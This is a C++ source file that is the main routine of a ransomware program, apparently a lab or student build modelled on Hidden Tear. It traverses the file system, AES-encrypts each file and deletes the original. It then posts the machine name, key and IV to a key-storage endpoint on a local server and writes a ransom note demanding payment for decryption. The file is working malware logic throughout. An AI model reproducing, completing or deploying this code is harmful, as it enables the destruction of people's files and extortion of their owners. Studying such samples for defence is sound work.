#include "cryptFile.h"
#include "traversal.h"
#include "post.h"
#include "pcID.h"
#include <cstdio>
#include <fstream>
#include "setbackground.h"

using namespace std;

int main(int argc, char* argv[])
{
    string host = "127.0.0.1";   
    string port = "80";
    string reponse_data;

    // encrypt files
	vector<string> en_filePaths;
    Traversal(en_filePaths,true);
    crypt_data* aesKey = generatekey();
    cout<<"Start encrpt a file...\n";
    for (int i=0; i<en_filePaths.size(); i++){
        cout<<"The file path is : "<<en_filePaths[i]<<endl;
        encrypt(aesKey, en_filePaths[i]);
        cout<< "Successfully encrypt, next remove...\n";
        if (remove(en_filePaths[i])==1) cout<< "Successfully remove\n";
    }
	cout<<"Finish all encrypt...\n";

    string pcname = getMachineName();
    cout<<"pcname is: "<<pcname<<endl;
    // cout<<"hexkey is: "<<aesKey->hexKey<<endl;
    // cout<<"hexiv is: "<<aesKey->hexIV<<endl;

    // post the pcname and key with iv to the server
    string page = "/project/public/index.php/index/index/storeKeys";
    string data = "pcname="+pcname+"&aeskey="+aesKey->hexKey+"&aesiv="+aesKey->hexIV; // +"&payed=false";

    int ret = post(host, port, page, data, reponse_data);
    if (ret != 0)
        cout << "error_code:" << ret << endl;

    cout << reponse_data << endl;

    string page2 = "/project/public/index.php/index/index/releaseKeys";
    string data2 = "id=31";
    int ret2 = post(host, port, page2, data2, reponse_data);
    if (ret2 != 0)
        cout << "error_code:" << ret2 << endl;

    cout << reponse_data << endl;

    ofstream outfile("Alert&Guide.txt");
    outfile << "*******************************************************************************"<<endl;
    outfile << "*               Welcome to the world of Hidden Tear, do you wanna cry!        *"<<endl;
    outfile << "*******************************************************************************"<<endl;
    outfile << "*          Your files have been encrpted, just cry and beg for our mercy!     *"<<endl;
    outfile << "*                          If you want to save your files                     *"<<endl;
    outfile << "*                 Please Follow our guide to decrypt your files !             *"<<endl;
    outfile << "*                    Be careful, or you'd lose them forever  !                *"<<endl;
    outfile << "*                                    Good Luck !                              *"<<endl;
    outfile << "*******************************************************************************"<<endl;
    outfile << "First, please visit our website at http://localhost/project/public/"<<endl;
    outfile << "Then, pay the money to obtain your key and iv. They're both necessary"<<endl;
    outfile << "At last, run the decrypt.out to save your files"<<endl;
    return 0;
}
